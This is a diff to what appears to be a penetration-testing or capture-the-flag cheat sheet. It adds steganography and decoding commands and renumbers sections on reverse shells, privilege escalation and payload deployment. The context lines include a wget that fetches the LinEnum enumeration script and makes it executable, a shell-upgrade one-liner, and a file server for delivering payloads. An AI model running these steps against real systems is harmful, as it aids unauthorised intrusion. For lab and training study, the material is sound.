@@ -148,7 +148,33 @@ $ smbclient //Target_IP/shared/dir
 
 $ telnet Target_IP 1234
 
-# 7° Reverse Shell
+# 7° Extract-Info
+
+$ exiftool picture.jpg
+
+$ steghide --info picture.jpg
+
+$ steghide --extract -sf picture.jpg
+
+$ stegseek picture.png
+
+$ binwalk picture.jpg
+
+$ binwalk -e picture.jpg
+
+$ binwalk -W picture.jpg
+
+$ echo 'SGVsbG8gV29ybGQ=' | base64 -d
+
+$ base64 -d encoded_file.txt > decoded_output.bin
+
+$ gpg -d encoded_file.txt.gpg > file.txt
+
+$ gunzip file.gz
+
+$ tar -xzvf file.tar.gz
+
+# 8° Reverse Shell
 
 ### Listening Basic Linux
 
@@ -192,7 +218,7 @@ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 `python3 -c 'import pty; pty.spawn("/bin/bash")'`
 
-# 8° Search Priv-Esc
+# 9° Search Priv-Esc
 
 $ cat /etc/proc/version
 
@@ -236,7 +262,7 @@ https://www.exploit-db.com
 
 `$ wget "https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" -O LinEnum.sh;chmod 700 LinEnum.sh`
 
-# 9° Deploy Payloads
+# 10° Deploy Payloads
 
 $ python2 -m SimpleHTTPServer 8000
 
